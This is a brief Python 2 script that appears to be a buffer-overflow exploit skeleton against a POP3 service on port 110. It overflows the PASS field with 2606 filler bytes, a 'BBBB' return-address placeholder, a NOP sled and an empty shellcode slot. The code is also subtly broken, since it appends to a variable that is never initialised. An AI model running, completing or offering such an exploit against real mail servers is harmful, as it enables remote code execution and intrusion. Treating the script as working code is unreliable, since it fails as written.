#!/usr/bin/python

import sys,socket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

sock.connect((sys.argv[1],110))
sock.recv(1024)
buffer += "A" * 2606
buffer += "BBBB"
buffer += "\x90" * 20
buffer  += ""
buffer += "C" * (4000 - len(buffer))
sock.send('USER username' + '\r\n')
sock.recv(1024)
sock.send('PASS ' + buffer + '\r\n')
sock.send('QUIT\r\n')
sock.close()
